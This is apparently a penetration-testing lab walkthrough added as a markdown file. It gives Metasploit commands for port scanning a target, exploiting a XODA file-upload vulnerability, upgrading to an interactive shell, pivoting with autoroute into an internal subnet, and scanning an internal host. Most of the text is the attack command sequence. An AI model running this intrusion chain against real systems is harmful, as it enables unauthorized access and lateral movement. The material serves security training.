@@ -1,0 +1,137 @@
+🛡️ Metasploit Workflow Documentation
+This document outlines a penetration testing workflow covering initial reconnaissance (port scanning), exploitation of a web application (XODA file upload), and post-exploitation session management and pivoting.
+
+Phase 1: Environment Setup & Port Scanning
+Objective: Set up the Metasploit environment and identify open ports on the target system.
+
+Metasploit Setup
+# Check your local IP (Attacker)
+
+ifconfig
+# Local IP: 192.86.140.2
+# Target IP: 192.86.140.3
+
+# Start the Metasploit database service
+service postgresql start
+
+# Start Metasploit console
+msfconsole
+
+---
+
+Port Scan Execution
+# Check database status
+db_status
+
+# Create a new workspace
+workspace -a port_scan
+
+# Search for a port scanning module
+search portscan
+
+# Select the TCP port scanning auxiliary module
+use auxiliary/scanner/portscan/tcp
+# OR: use 5 (if '5' is the index number)
+
+# View configuration options
+show options
+
+# Set the target IP address
+set RHOSTS 192.86.140.3
+
+# Set the full port range
+set PORTS 1-65535
+
+# Execute the scan
+run
+
+# Return to the main msfconsole prompt
+back
+
+---
+
+Phase 2: Exploitation (XODA File Upload)
+Objective: Utilize a web application vulnerability to gain initial access to the target system.
+
+Exploit Configuration
+Bash
+
+# Verify the web application is running (optional check)
+# From Attacker's machine BASH: 
+
+curl 192.86.140.3
+
+# Search for the XODA file upload exploit
+search xoda
+
+# Select the exploit module
+use exploit/unix/webapp/xoda_file_upload
+
+# View required options
+show options
+
+# Set the target IP
+set RHOSTS 192.86.140.3
+
+# Set the target web application path
+set TARGETURI /
+Gain Initial Access to the Target System
+Bash
+
+# Execute exploit
+exploit
+
+# Stabilize shell (if needed after getting a Meterpreter session)
+shell
+/bin/bash -i
+Phase 3: Post-Exploitation & Pivoting
+Objective: Gather system and network information and set up a pivot route to an internal network.
+
+Network Discovery and Shell Management
+Bash
+
+# Network discovery (from the target's shell)
+ifconfig
+# eth0 -> 192.86.140.3 (External)
+# eth1 -> 192.113.124.2 (Internal/Pivot Point)
+
+# Background the session (Return to Meterpreter prompt)
+background
+
+# Background the Meterpreter session (Return to msfconsole prompt)
+background
+
+# View active sessions
+sessions
+Internal Network Pivoting
+Bash
+
+# Set up a route through the compromised system (Meterpreter) 
+# to access the internal network (192.113.124.0/24)
+run autoroute -s 192.113.124.0/24
+
+# Execute the routing command
+run
+
+Phase 4: Internal Reconnaissance
+Objective: Scan a host on the newly accessible internal network (192.113.124.3) using the established pivot route.
+
+Internal Port Scan
+Bash
+search portscan 
+
+# Select the TCP port scanning auxiliary module
+use auxiliary/scanner/portscan/tcp
+
+# View options for configuration
+show options
+
+# Set the INTERNAL target IP address 
+set RHOSTS 192.113.124.3 
+# Traffic will route through the compromised host (pivot).
+
+# Execute the internal scan
+run
+
+# Return to the main msfconsole prompt
+back
